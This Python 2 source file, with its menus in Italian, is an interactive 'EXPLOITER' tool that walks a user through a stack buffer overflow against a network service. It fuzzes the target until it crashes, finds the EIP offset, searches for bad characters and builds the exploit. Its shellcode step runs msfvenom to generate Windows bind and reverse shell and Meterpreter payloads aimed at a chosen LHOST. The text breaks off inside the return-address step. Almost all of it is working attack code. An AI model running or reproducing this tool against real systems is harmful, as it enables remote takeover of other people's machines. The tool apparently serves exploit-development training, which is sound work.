# -*- coding: utf-8 -*-

import traceback
import sys
import os
import subprocess

# - - - - - - - - - - - - - - - - - - - - - - - - 
from lib_socket import *
from lib_primitive import *
from lib_funzioni import *
from lib_file_manager import *
# - - - - - - - - - - - - - - - - - - - - - - - - 

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'

NC='\033[0m'

conf_file = "conf.txt"
session_file = "session.txt"

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

SESSION = reset_session ()

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


def _tester ():
	print "[i] Provo a comunicare con il target..."
	status = sock.full_check()

	while (status != 0):
		raw_input(YELLOW + "[?] Comunicazione fallita, invio per riprovare: " + NC)
		print "\n[i] Rirovo a comunicare con il target..."
		status = sock.full_check()

	if (status == 0):
		print GREEN + "[*] Comunicazione riuscita\n" + NC

	else:
		print RED + "[!] Errore durante la comunicazione con il target, interruzione." + NC
		sys.exit(-1)




# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




print "[i] Carico file di configurazione: " + str(conf_file) + " ..."
config = read_config (conf_file)

if (type(config) == int):
	if (config == -1):
		print "[!] Manca almeno un parametro fondamentale, interruzione."
		if raw_input("\n\n[?] Inizializzare il file di configurazione [Y/n]? ") == "Y": reset_config (conf_file)
		sys.exit(-1)

	elif(config == -3):
		print "[!] Eccezione durante la lettura di " + str(conf_file)
		if raw_input("\n\n[?] Inizializzare il file di configurazione [Y/n]? ") == "Y": reset_config (conf_file)
		sys.exit(-1)

else:
	print "[*] File di configurazione caricato correttamente:"
	print "\t- Indirizzo Target: " + str(config['addr'])
	print "\t- Porta Target:     " + str(config['port'])
	print "\t- Numero di lbytes: " + str(len(config['lbytes']))
	print "\t- Numero di rbytes: " + str(len(config['rbytes']))
	print "\t- Steps protocollo: " + str(len(config['protocol']))
	print "\n"

sock = Sock(config['addr'], config['port'])



SESSION = read_session(session_file)
if ( type(SESSION) != dict) or (SESSION == -3):
	SESSION = reset_session ()


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


def _banner(banner_msg):
	os.system('clear')
	print "####################################################################"
	print "#                            EXPLOITER                             #"
	print "####################################################################"
	print "  " + banner_msg
	print "####################################################################\n"



#################################################################################################



def _main_menu ():
	while True:
		try:
			global SESSION
			global sock
			_banner ("Menu' principale")

			print "\tC)  Inizializza il file di configurazione"
			print "\tS)  Inizializza la sessione"
			print "\t0)  Controlla comunicazione\n"
			print "\t1)  RAW FUZZING" + "\t\t\t" + str(GREEN + str(SESSION ['raw_fuzzing']['buffer_apprx_length']) + NC if SESSION ['raw_fuzzing']['buffer_apprx_length'] != None else RED + str(SESSION ['raw_fuzzing']['buffer_apprx_length']) + NC)
			print "\t2)  PRECISE FUZZING" + "\t\t" + str(GREEN + str(SESSION ['precise_fuzzing']['buffer_length']) + NC if SESSION ['precise_fuzzing']['buffer_length'] != None else RED + str(SESSION ['precise_fuzzing']['buffer_length']) + NC)
			print "\t3)  CONTROL EIP" + "\t\t\t" + str(GREEN + str(SESSION ['control_eip']['control_eip_pass']) + NC if SESSION ['control_eip']['control_eip_pass'] != None else RED + str(SESSION ['control_eip']['control_eip_pass']) + NC)
			print "\t4)  SPACE CHECK" + "\t\t\t" + str(GREEN + str(SESSION ['space_check']['space']) + NC if SESSION ['space_check']['space'] != None else RED + str(SESSION ['space_check']['space']) + NC)
			print "\t5)  FIND BADCHAR" + "\t\t" + str(GREEN + "[ " + str(', '.join([str(x) for x in SESSION ['find_badchar']['badchar']])) + " ]" + NC if SESSION ['find_badchar']['badchar'] != None else RED + str(SESSION ['find_badchar']['badchar']) + NC)
			print "\t6)  GENERATE SHELLCODE" + "\t\t" + str(GREEN + str(str(len(SESSION ['shellcode']['shellcode'])) + " bytes") + NC if SESSION ['shellcode']['shellcode'] != None else RED + str(SESSION ['shellcode']['shellcode']) + NC)
			print "\t7)  FIND RETURN ADDRESS"  + "\t\t" + str(GREEN + str(SESSION ['find_return_address']['return_address']) + NC if SESSION ['find_return_address']['return_address'] != None else RED + str(SESSION ['find_return_address']['return_address']) + NC)
			print "\n\t98) BUILD PoC (Proof Of Concept)"
			print "\t99) BUILD EXPLOIT"
			print "\n--------------------------------------------------------------------"
			
			scelta = raw_input ("[?] Scelta: ")
			if scelta == "C":
				if raw_input("\n\n[?] Inizializzare il file di configurazione [Y/n]? ") == "Y": reset_config (conf_file)
				else: pass
			if scelta == "S":
				if raw_input("\n\n[?] Inizializzare la sessione [Y/n]? ") == "Y": SESSION = reset_session(); save_session(session_file, SESSION)
				else: pass
			if scelta == "0":
				_tester ()
				raw_input ("[?] Premere invio per continuare: ")
			elif scelta == "1":
				fx_raw_fuzzing ()
				save_session(session_file, SESSION)
			elif scelta == "2":
				fx_precise_fuzzing ()
				save_session(session_file, SESSION)
			elif scelta == "3":
				fx_control_eip ()
				save_session(session_file, SESSION)
			elif scelta == "4":
				fx_space_check ()
				save_session(session_file, SESSION)
			elif scelta == "5":
				fx_find_badchar ()
				save_session(session_file, SESSION)
			elif scelta == "6":
				fx_generate_shellcode ()
				save_session(session_file, SESSION)
			elif scelta == "7":
				fx_find_return_address()
				save_session(session_file, SESSION)
			elif scelta == "98":
				fx_build_poc()
			elif scelta == "99":
				fx_build_exploit()

		except KeyboardInterrupt:
			sys.exit(0)
			#if raw_input("\n\n[?] Terminare l'applicazione [Y/n]? ") == "Y": sys.exit(0)
			#else: pass


################################################################################################# 


def fx_raw_fuzzing ():
	global SESSION
	global sock
	_banner ("RAW FUZZING")
	_tester ()
	
	correct = False
	while (not correct):
		try:
			steps = raw_input ("[?] Inserisci il valore di " + PURPLE + "steps" + NC + " [1000]: ")
			max_length = raw_input ("[?] Inserisci il valore di " + PURPLE + "max_length" + NC + " [10000]: ")
			
			if (steps == ""): steps = 1000
			if (max_length == ""): max_length = 10000

			int(steps)
			int(max_length)
			correct = True
		except KeyboardInterrupt:
			return -1
		except:
			print YELLOW + "[!] Parametri non validi, riprovare\n" + NC
			correct = False

	print ""
	sock.connect()
	buffer_apprx_length = simple_fuzzer (sock, config, int(steps), int(max_length))

	if (buffer_apprx_length > 0):
		print GREEN + "\n[*] Il target e' crashato con un buffer approssimativo di: " + str(buffer_apprx_length) + " bytes." + NC
		SESSION ['raw_fuzzing']['buffer_apprx_length'] = buffer_apprx_length
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

	else:
		print RED + "\n[!] ERRORE: Il target non sembra essere crashato." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

	

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



def fx_precise_fuzzing ():
	global SESSION
	global sock
	_banner ("PRECISE FUZZING")
	_tester ()


	buffer_apprx_length = SESSION ['raw_fuzzing']['buffer_apprx_length']
	if (buffer_apprx_length == None):
		print YELLOW + "[!] Il valore di buffer_apprx_length non e' specificato." + NC
		correct = False
		while (not correct):
			try:
				buffer_apprx_length = input ("[?] Inserire il valore di " + PURPLE + "buffer_apprx_length" + NC + ": ");
				#int(buffer_apprx_length)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print RED + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	pattern = pattern_create(buffer_apprx_length)

	if (type(config) != int):
		print GREEN + "[*] Generato pattern di: " + str(buffer_apprx_length) + " bytes." + NC
	else:
		print RED + "\n[!] ERRORE: impossibile generare il pattern." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1


	print "\n[*] Invio il pattern..."
	sock.connect()
	status = sock.run_protocol_exploit(config, pattern)

	while (status < 0):
		print "[!] Invio fallito con errore: " + str(status)
		raw_input ("[?] Riavviare il servizio e premere invio: ")
		print "\n[*] Invio il pattern..."
		sock.connect()
		status = sock.run_protocol_exploit(config, pattern)


	time.sleep(1)
	if (status >= 0):
		check_status = sock.full_check()
		if (check_status < 0):
			print GREEN + "\n[*] Il target e' crashato, controllare il valore del registro EIP" + NC
		else:
			print RED + "\n[!] ERRORE: Il target non sembra essere crashato." + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

	else:
		print RED + "\n[!] ERRORE: invio del pattern fallito." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

	# - - - - - - - - - - - - - - - - - - - - - - - - 

	buffer_length = -1

	while (buffer_length < 0):
		eip_value = raw_input ("[?] Inserisci il valore del registro EIP: ")
		if (len(eip_value) == 8):
			buffer_length = pattern_offset(eip_value)
			break #if (buffer_length) < 0: print YELLOW + "[!] Valore registro non valido, riprovare\n" + NC
		else:
			print YELLOW + "[!] Valore registro non valido, riprovare\n" + NC

	if (buffer_length > 0):
		print GREEN + "\n[*] La dimensione precisa del buffer è di " + str(buffer_length) + " bytes." + NC
		SESSION ['precise_fuzzing']['eip_value'] = eip_value
		SESSION ['precise_fuzzing']['buffer_length'] = buffer_length
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

	else:
		print RED + "\n[!] ERRORE: non e' stato possibile eseguire il calcolo." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



def fx_control_eip ():
	global SESSION
	global sock
	_banner ("CONTROL EIP")
	_tester ()


	buffer_length = SESSION ['precise_fuzzing']['buffer_length']
	if (buffer_length == None):
		print YELLOW + "[!] Il valore di buffer_length non e' specificato." + NC
		correct = False
		while (not correct):
			try:
				buffer_length = input ("[?] Inserire il valore di " + PURPLE + "buffer_length" + NC + ": ");
				#int(buffer_length)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	print "\n[*] Invio il buffer..."
	status = eip_check (sock, config, buffer_length)


	time.sleep(1)
	if (status >= 0):
		check_status = sock.full_check()
		if (check_status < 0):
			print GREEN + "\n[*] Il target e' crashato, controllare il valore del registro EIP" + NC
		else:
			print RED + "\n[!] ERRORE: Il target non sembra essere crashato." + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

	else:
		print RED + "\n[!] ERRORE: invio del buffer non riuscito." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1



	if raw_input("\n\n[?] Inserisci il valore del registro EIP: ") == "42424242":
		SESSION ['control_eip']['control_eip_pass'] = True
		print GREEN + "\n[*] Controllo registro EIP completato." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

	else:
		print RED + "\n[!] ERRORE: controllo registro EIP fallito, valore inatteso." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



def fx_space_check():
	global SESSION
	global sock
	_banner ("SPACE CHECK")
	_tester ()


	buffer_length = SESSION ['precise_fuzzing']['buffer_length']
	if (buffer_length == None):
		print YELLOW + "[!] Il valore di buffer_length non è specificato." + NC
		correct = False
		while (not correct):
			try:
				buffer_length = input ("[?] Inserire il valore di " + PURPLE + "buffer_length" + NC + ": ");
				#int(buffer_length)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	print "\n[*] Invio il buffer..."
	status = space_check (sock, config, buffer_length)


	time.sleep(1)
	if (status >= 0):
		check_status = sock.full_check()
		if (check_status < 0):
			print "\n[*] Il target e' crashato"
		else:
			print RED + "\n[!] ERRORE: Il target non sembra essere crashato." + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

	else:
		print RED + "\n[!] ERRORE: invio del buffer non riuscito." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1


	print "\n[?] Inseriscil il dump del registro ESP dopo i caratteri BBBB\n(ctrl+c per terminare): "
	esp_dump = ""
	while True:
		try:
			dmp = raw_input("")
			esp_dump += dmp
		except KeyboardInterrupt:
			break


	res = extra_space_offset (esp_dump)
	if (type(res) == int):
		if (res >= 0):
			print "\n[*] Spazio calcolato: " + str(res) + " bytes."
			SESSION ['space_check']['space'] = res
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

		else:
			print RED + "\n[!] ERRORE: non e' stato possibile eseguire il calcolo." + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1
	
	else:
		print RED + "\n[!] ERRORE: non e' stato possibile eseguire il calcolo." + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



def fx_find_badchar ():
	global SESSION
	global sock
	_banner ("FIND BADCHAR")


	buffer_length = SESSION ['precise_fuzzing']['buffer_length']
	if (buffer_length == None):
		print YELLOW + "[!] Il valore di buffer_length non è specificato." + NC
		correct = False
		while (not correct):
			try:
				buffer_length = input ("[?] Inserire il valore di " + PURPLE + "buffer_length" + NC + ": ");
				#int(buffer_length)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False



	space = SESSION ['space_check']['space']
	if (space == None):
		print YELLOW + "[!] Il valore di space non è specificato." + NC
		correct = False
		while (not correct):
			try:
				space = input ("[?] Inserire il valore di " + PURPLE + "space" + NC + ": ");
				#int(space)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	ex_chars = [];
	if (SESSION ['find_badchar']['badchar'] != None):
		ex_chars = SESSION ['find_badchar']['badchar']


	while True:
		try:
			_banner ("FIND BADCHAR")
			print "\tARRAY BADCHAR: " + PURPLE + ' '.join([str(x) for x in ex_chars]) + NC
			print ""
			print "\t1)  Inserisci badchar"
			print "\t2)  Inserisci badchar comuni (\\x00\\x0a\\x0d)"
			print "\t3)  Rimuovi tutti i badchar"
			print "\t4)  Invia i badchar (testa servizio)"
			print "\t5)  Salva e continua con i seguenti badchar\n"
			print "\t6)  RICERCA GUIDATA (NON PRECISA)"
			print "\n--------------------------------------------------------------------"
			
			scelta = raw_input ("[?] Scelta: ")

			# ----------------------------------------------------------------------------

			if scelta == "1":
				correct = False
				while (not correct):
					try:
						ch = raw_input("[?] Inserisci esadecimale: ")
						ch.decode('hex')
						if (len(ch) == 2):
							ex_chars.append(ch)
							correct = True
						else:
							raise Exception("Valore non valido")
					except KeyboardInterrupt:
						break
					except Exception, e:
						print RED + "[!] ERRORE: " + str(e) + "\n" + NC
						correct = False

			# ----------------------------------------------------------------------------

			elif scelta == "2":
				try:
					if '00' not in ex_chars: ex_chars.append('00')
					if '0a' not in ex_chars: ex_chars.append('0a')
					if '0d' not in ex_chars: ex_chars.append('0d')

				except KeyboardInterrupt:
					pass

			# ----------------------------------------------------------------------------

			elif scelta == "3":
				try:
					if raw_input("\n[?] Rimuovere tutti valori inseriti [Y/n]? ") == "Y": ex_chars = []
					else: pass

				except KeyboardInterrupt:
					pass

			# ----------------------------------------------------------------------------

			elif scelta == "4":
				try:
					_tester ()
					sock.connect()

					status = -1
					if (space > 260):
						status = send_badchar(sock, config, buffer_length, ex_chars, space, False)
					else:
						status = send_badchar(sock, config, buffer_length, ex_chars, space, True)


					if (status < 0):
						print YELLOW + "[!] Invio fallito con errore: " + str(status) + NC
						raw_input ("[?] Riavviare il servizio e premere invio: ")

					else:
						time.sleep(1)
						check_status = sock.full_check()
						if (check_status < 0):
							print GREEN + "\n[*] Il target e' crashato, controllare il dump del registro ESP" + NC
							raw_input ("[?] Riavviare il servizio e premere invio: ")
						else:
							print RED + "\n[!] ERRORE: Il target non sembra essere crashato." + NC
							raw_input ("[?] Riavviare il servizio e premere invio: ")

				except KeyboardInterrupt:
					pass

			# ----------------------------------------------------------------------------
			

			elif scelta == "5":
				try:
					print "\n[*] Badchar selezionati: " + ' '.join([str(x) for x in ex_chars])
					SESSION ['find_badchar']['badchar'] = ex_chars
					print "\n\n--------------------------------------------------------------------"
					raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

				except KeyboardInterrupt:
					pass


			# ----------------------------------------------------------------------------

			elif scelta == "6":
				break


		except KeyboardInterrupt:
			return 0



	#_tester ()
	done = False

	while (not done):
		_tester ()
		print "\n[*] Invio il buffer con badchar..."
		sock.connect()

		status = -1
		if (space > 260):
			status = send_badchar(sock, config, buffer_length, ex_chars, space, False)
		else:
			status = send_badchar(sock, config, buffer_length, ex_chars, space, True)

		while (status < 0):
			print YELLOW + "[!] Invio fallito con errore: " + str(status) + NC
			raw_input ("[?] Riavviare il servizio e premere invio: ")
			print "\n[*] Invio il buffer con badchar..."
			if (space > 260):
				status = send_badchar(sock, config, buffer_length, ex_chars, space, False)
			else:
				status = send_badchar(sock, config, buffer_length, ex_chars, space, True)


		time.sleep(1)
		if (status >= 0):
			check_status = sock.full_check()
			if (check_status < 0):
				print GREEN + "\n[*] Il target e' crashato, controllare il dump del registro ESP" + NC
			else:
				print RED + "\n[!] ERRORE: Il target non sembra essere crashato." + NC
				print "\n\n--------------------------------------------------------------------"
				raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

		else:
			print RED + "\n[!] ERRORE: invio del buffer non riuscito." + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1



		if (space > 260):
			print "\n[?] Inseriscil il dump del registro ESP fra il registro EIP e CCCC\n(ctrl+c per terminare): "		
		else:
			print "\n[?] Inseriscil il dump del registro ESP fra i caratteri AAAA e BBBB\n(ctrl+c per terminare): "

		esp_dump = ""
		while True:
			try:
				dmp = raw_input("")
				esp_dump += dmp
			except KeyboardInterrupt:
				break

		res = analyze_badchar (esp_dump, ex_chars)
		if (type(res) == int):
			if (res == 0):
				done = True
				print "\n[*] Badchar trovati: " + ' '.join([str(x) for x in ex_chars])
				SESSION ['find_badchar']['badchar'] = ex_chars
				print "\n\n--------------------------------------------------------------------"
				raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

			else:
				print RED + "\n[!] ERRORE: non e' stato possibile eseguire il calcolo." + NC
				print "\n\n--------------------------------------------------------------------"
				raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1
		
		else:
			ex_chars = ex_chars + res
			print "\n\n[*] Badchar trovati: " + ' '.join([str(x) for x in ex_chars])
			print YELLOW + "[?] Non tutti i badchar sono stati identificati, premere invio per riprovare: " + NC




# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



def fx_generate_shellcode ():
	global SESSION
	global sock
	_banner ("GENERATE SHELLCODE")


	badchar = SESSION ['find_badchar']['badchar']
	if (badchar == None):
		print RED + "[!] ERRORE: e' necessario trovare i badchar prima di generare la shellcode." + NC
		raw_input ("[?] Premere invio per tornare al menu' principale: ");
		return -1


	buffer_length = SESSION ['precise_fuzzing']['buffer_length']
	if (buffer_length == None):
		print YELLOW + "[!] Il valore di buffer_length non è specificato." + NC
		correct = False
		while (not correct):
			try:
				buffer_length = input ("[?] Inserire il valore di " + PURPLE + "buffer_length" + NC + ": ");
				#int(buffer_length)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	space = SESSION ['space_check']['space']
	if (space == None):
		print YELLOW + "[!] Il valore di space non è specificato." + NC
		correct = False
		while (not correct):
			try:
				space = input ("[?] Inserire il valore di " + PURPLE + "space" + NC + ": ");
				#int(space)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	shellcode = ""
	if (SESSION ['shellcode']['shellcode'] != None):
		shellcode = SESSION ['shellcode']['shellcode']

	while True:
		try:
			_banner ("GENERATE SHELLCODE")
			print "\tSHELLCODE: " + str(PURPLE + str(len(shellcode)) + " bytes" + NC if len(shellcode) > 0 else RED + str(len(shellcode)) + " bytes" + NC)
			print ""
			print "\t1)  Leggi shellcode dal file shellcode.txt (HEX)"
			print "\t2)  Incolla shellcode (HEX)"
			print "\t3)  Salva la shellcode\n"
			print "\t4)  GERNERAZIONE GUIDATA (richiede metasploit)"
			print "\n--------------------------------------------------------------------"
			
			scelta = raw_input ("[?] Scelta: ")


			# ----------------------------------------------------------------------------


			if scelta == "1":
				try:
					f = open("shellcode.txt", "r")
					shcd = f.read().replace(' ' , '').replace('\n' , '')
					f.close ()

					if (len(shcd) <= (space + 16)):				# 16 NOP bytes
						shcd.decode('hex')
						shellcode = shcd

						correct = True
						for bc in badchar:
							for sc in shcd.decode('hex'):
								if str(bc) == str(sc):
									correct = False

						if (correct):
							print GREEN + "\n[*] La shellcode e' stata validata con successo" +  NC
							raw_input ("[?] Premere invio per continuare: ")
						else:
							print YELLOW + "\n[!] La shellcode e' stata salvata, ma contiene dei badchar" +  NC
							raw_input ("[?] Premere invio per continuare: ")

					else:
						print RED + "\n[!] La shellcode e' troppo grande (" + str(len(shcd)) + " > " + str((space + 16)) + ")" +  NC
						raw_input ("[?] Premere invio per continuare: ")

				except KeyboardInterrupt:
					pass
				except IOError:
					print RED + "\n[!] ERRORE file shellcode.txt non trovato" + NC
					raw_input ("[?] Premere invio per continuare: ")
				except Exception, e:
					print RED + "[!] ERRORE: " + str(e) + "\n" + NC
					raw_input ("[?] Premere invio per continuare: ")
				


			# ----------------------------------------------------------------------------


			if scelta == "2":
				try:

					pasted_shcd = raw_input ("[?] Inseriscil la shellcode in formato HEX: ")

					shcd = pasted_shcd.replace(' ' , '').replace('\n' , '')
					if (len(shcd) <= (space + 16)):				# 16 NOP bytes
						shcd.decode('hex')
						shellcode = shcd
						
						correct = True
						for bc in badchar:
							for sc in shcd.decode('hex'):
								if str(bc) == str(sc):
									correct = False

						if (correct):
							print GREEN + "\n[*] La shellcode e' stata validata con successo" +  NC
							raw_input ("[?] Premere invio per continuare: ")
						else:
							print YELLOW + "\n[!] La shellcode e' stata salvata, ma contiene dei badchar" +  NC
							raw_input ("[?] Premere invio per continuare: ")

					else:
						print RED + "\n[!] La shellcode e' troppo grande (" + str(len(shcd)) + " > " + str((space + 16)) + ")" +  NC
						raw_input ("[?] Premere invio per continuare: ")

				except KeyboardInterrupt:
					pass
				except IOError:
					print RED + "\n[!] ERRORE file shellcode.txt non trovato" + NC
					raw_input ("[?] Premere invio per continuare: ")
				except Exception, e:
					print RED + "[!] ERRORE: " + str(e) + "\n" + NC
					raw_input ("[?] Premere invio per continuare: ")


			# ----------------------------------------------------------------------------


			elif scelta == "3":
				try:
					print "[*] Shellcode: " + str(PURPLE + str(len(shellcode)) + " bytes" + NC if len(shellcode) > 0 else RED + str(len(shellcode)) + " bytes" + NC)
					SESSION ['shellcode']['shellcode'] = shellcode
					print "\n\n--------------------------------------------------------------------"
					raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0
				except KeyboardInterrupt:
					pass


			# ----------------------------------------------------------------------------

			elif scelta == "4":
				try:

					LHOST = ""
					LPORT = ""

					print "[*] Shell code disponibili: "
					print "\n\t1)  windows/shell_bind_tcp"
					print "\t2)  windows/shell_reverse_tcp"
					print "\t3)  windows/meterpreter/bind_tcp"
					print "\t4)  windows/meterpreter/reverse_tcp"

					shcd_cmd = ""
					badchar_string = ""
					for c in badchar:
						badchar_string += "\\x" + str(c)

					scelta = raw_input ("\n[?] Scelta: ")
					if scelta == "1":
						LPORT = raw_input ("[?] LPORT: ")
						if len(badchar_string) > 0: shcd_cmd = "msfvenom -a x86 -p windows/shell_bind_tcp LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -b '" + badchar_string + "' -f hex > shellcode.txt"
						else:shcd_cmd = "msfvenom -a x86 -p windows/shell_bind_tcp LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -f hex > shellcode.txt"

					elif scelta == "2":
						LHOST = raw_input ("[?] LHOST: ")
						LPORT = raw_input ("[?] LPORT: ")
						if len(badchar_string) > 0: shcd_cmd = "msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=" + str(LHOST) + " LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -b '" + badchar_string + "' -f hex > shellcode.txt"
						else: shcd_cmd = "msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=" + str(LHOST) + " LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -f hex > shellcode.txt"

					elif scelta == "3":
						LPORT = raw_input ("[?] LPORT: ")
						if len(badchar_string) > 0: shcd_cmd = "msfvenom -a x86 -p windows/meterpreter/bind_tcp LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -b '" + badchar_string + "' -f hex > shellcode.txt"
						else:shcd_cmd = "msfvenom -a x86 -p windows/meterpreter/bind_tcp LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -f hex > shellcode.txt"

					elif scelta == "4":
						LHOST = raw_input ("[?] LHOST: ")
						LPORT = raw_input ("[?] LPORT: ")
						if len(badchar_string) > 0: shcd_cmd = "msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=" + str(LHOST) + " LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -b '" + badchar_string + "' -f hex > shellcode.txt"
						else: shcd_cmd = "msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=" + str(LHOST) + " LPORT=" + str(LPORT) + " -e x86/shikata_ga_nai -f hex > shellcode.txt"

					else:
						raise Exception("Scelta sbagliata")

					
					print "[i] Generazione shellcode, comando utilizzato: " + str(shcd_cmd)
					proc = subprocess.Popen(shcd_cmd, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
					stdout, stderr = proc.communicate()
					print stdout


					if (proc.returncode != 0):
						print RED + "\n[!] Il comando non e' estato eseguito correttamente: " +  NC
						print RED + stderr + NC
						raw_input ("[?] Premere invio per continuare: ")

					else:
						f = open("shellcode.txt", "r")
						shcd = f.read().replace(' ' , '').replace('\n' , '')
						f.close ()

						if (len(shcd) <= (space + 16)):				# 16 NOP bytes
							shcd.decode('hex')
							shellcode = shcd

							correct = True
							for bc in badchar:
								for sc in shcd.decode('hex'):
									if str(bc) == str(sc):
										correct = False

							if (correct):
								print GREEN + "\n[*] La shellcode e' stata validata con successo" +  NC
								raw_input ("[?] Premere invio per continuare: ")
							else:
								print YELLOW + "\n[!] La shellcode e' stata salvata, ma contiene dei badchar" +  NC
								raw_input ("[?] Premere invio per continuare: ")

						else:
							print RED + "\n[!] La shellcode e' troppo grande (" + str(len(shcd)) + " > " + str((space + 16)) + ")" +  NC
							raw_input ("[?] Premere invio per continuare: ")


				except KeyboardInterrupt:
					pass
				except Exception, e:
					print RED + "[!] ERRORE: " + str(e) + "\n" + NC
					raw_input ("[?] Premere invio per continuare: ")

			# ----------------------------------------------------------------------------

		except KeyboardInterrupt:
			return -1



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



def fx_find_return_address ():
	global SESSION
	global sock
	_banner ("FIND RETURN ADDRESS")


	shellcode = SESSION ['shellcode']['shellcode']
	if (shellcode == None):
		print RED + "[!] ERRORE: e' necessario generare la shellcode prima di trovare l'indirizzo di ritorno." + NC
		raw_input ("[?] Premere invio per tornare al menu' principale: ");
		return -1


	buffer_length = SESSION ['precise_fuzzing']['buffer_length']
	if (buffer_length == None):
		print YELLOW + "[!] Il valore di buffer_length non è specificato." + NC
		correct = False
		while (not correct):
			try:
				buffer_length = input ("[?] Inserire il valore di " + PURPLE + "buffer_length" + NC + ": ");
				#int(buffer_length)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	space = SESSION ['space_check']['space']
	if (space == None):
		print YELLOW + "[!] Il valore di space non è specificato." + NC
		correct = False
		while (not correct):
			try:
				space = input ("[?] Inserire il valore di " + PURPLE + "space" + NC + ": ");
				#int(space)
				correct = True
			except KeyboardInterrupt:
				return -1
			except:
				print YELLOW + "[!] Valore non valido, riprovare\n" + NC
				correct = False


	candidate = [];
	return_address = None;

	if (SESSION ['find_return_address']['candidate'] != None):
		candidate = SESSION ['find_return_address']['candidate']

	if (SESSION ['find_return_address']['return_address'] != None):
		return_address = SESSION ['find_return_address']['return_address']


	while True:
		try:
			_banner ("FIND RETURN ADDRESS")
			print "\tCANDIDATE:\t" + str(PURPLE + ', '.join([str(x) for x in candidate]) + NC if candidate != [] else RED + str(candidate) + NC)
			print "\tRETURN ADDRESS:\t" + str(PURPLE + str(return_address) + NC if return_address != None else RED + str(return_address) + NC)
			print ""
			print "\t1)  Inserisci indirizzo di ritorno"
			print ""
			print "\t2)  Aggiungi candidato"
			print "\t3)  Rimuovi tutti i candidati"
			print ""
			print "\t4)  Testa indirizzo di ritorno"
			print "\t5)  Testa i candidati"
			print ""
			print "\t6)  Salva la configurazione attuale\n"
			print ""
			print "\t TIP: per trovare tutti gli indirizzi di ritorno utilizzare mona:"
			print "\t      !mona modules"
